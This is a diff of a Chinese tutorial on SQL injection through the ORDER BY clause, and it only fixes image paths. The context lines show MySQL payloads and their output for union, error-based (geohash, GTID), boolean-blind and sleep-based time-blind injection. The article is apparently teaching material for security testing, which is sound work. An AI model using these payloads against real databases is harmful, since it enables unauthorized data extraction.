@@ -110,7 +110,7 @@ mysql&gt; select * from users order by 6;
 ERROR 1054 (42S22): Unknown column &#39;6&#39; in &#39;order clause&#39;
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165050006.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165050006.png)
 
 ### 3、联合注入(罕见)
 
@@ -150,7 +150,7 @@ mysql&gt; (select * from users order by id) union select 1,2,3,4,5;
 
 这种情况非常罕见，利用条件比较苛刻。
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165136764.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165136764.png)
 
 ```sql
 mysql&gt; (select * from users order by id) union select 1,user(),3,4,version();
@@ -166,7 +166,7 @@ mysql&gt; (select * from users order by id) union select 1,user(),3,4,version();
 5 rows in set (0.01 sec)
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165152148.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165152148.png)
 
 ### 4、报错注入
 
@@ -197,7 +197,7 @@ ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function ST_LA
 mysql&gt;
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165245962.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165245962.png)
 
 
 
@@ -213,7 +213,7 @@ mysql&gt; select * from users order by id/(ST_LatFromGeoHash((select version()))
 ERROR 1411 (HY000): Incorrect geohash value: &#39;8.0.31&#39; for function ST_LATFROMGEOHASH
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165259586.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165259586.png)
 
 #### 3）GTID报错
 
@@ -227,7 +227,7 @@ ERROR 1772 (HY000): Malformed GTID set specification &#39;5.7.26&#39;.
 mysql&gt;
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165418105.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165418105.png)
 
 ```sql
 # mysql 8.0.31
@@ -238,7 +238,7 @@ mysql&gt; select * from users order by users.id/(gtid_subset(version(),1));
 ERROR 1772 (HY000): Malformed GTID set specification &#39;8.0.31&#39;.
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165459330.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165459330.png)
 
 #### 4）Duplicate key报错
 
@@ -289,7 +289,7 @@ mysql&gt; select * from users order by if(1=1,id,age);
 4 rows in set (0.00 sec)
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165613578.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165613578.png)
 
 可以看到这种方法，必须要知道列名，利用还是有条件的。
 
@@ -317,13 +317,13 @@ mysql&gt; select * from users order by if((substr(version(),1,1)=&#39;6&#39;),id
 4 rows in set (0.01 sec)
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165647631.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165647631.png)
 
 网上有些文章直接用数字代替列名，如`if(1=1,1,4)`，但是本地测试时两个版本都没有成功。如下：
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165657542.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165657542.png)
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165707025.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165707025.png)
 
 #### 2）rand
 
@@ -335,7 +335,7 @@ order by rand(0)
 order by rand(substr(version(),1,1)=&#39;8&#39;)
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165723761.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165723761.png)
 
 #### 3）位运算符
 
@@ -352,7 +352,7 @@ order by id^1;
 select * from users order by id^(substr(version(),1,1)=&#39;8&#39;);select * from users order by id^(substr(version(),1,1)=&#39;6&#39;);
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165803446.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165803446.png)
 
 
 
@@ -360,7 +360,7 @@ select * from users order by id^(substr(version(),1,1)=&#39;8&#39;);select * fro
 order by id^(select (select version()) regexp &#39;^5&#39;);order by id^(select (select version()) regexp 0x5e35);  # 0x5e35 &lt;-&gt; hex(&#39;^5&#39;) # 注意 regexp 在不同版本下对十六进制匹配会有些微小的差异
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165815046.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165815046.png)
 
 ### 6、时间盲注
 
@@ -390,7 +390,7 @@ mysql&gt; select * from users order by id,if((substr(version(),1,1)=8),sleep(1),
 4 rows in set (4.01 sec)
 ```
 
-![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165900602.png)
+![图片](resource/SQL注入之OrderBy位置点注入.assets/640-20230814165900602.png)
 
 # 修复建议
 
@@ -407,7 +407,7 @@ mysql&gt; select * from users order by id,if((substr(version(),1,1)=8),sleep(1),
 
 微信扫一扫，关注该公众号
 
-![img](/resource/SQL注入之OrderBy位置点注入.assets/qrcode-20230814164512823)
+![img](resource/SQL注入之OrderBy位置点注入.assets/qrcode-20230814164512823.png)
 
 
 
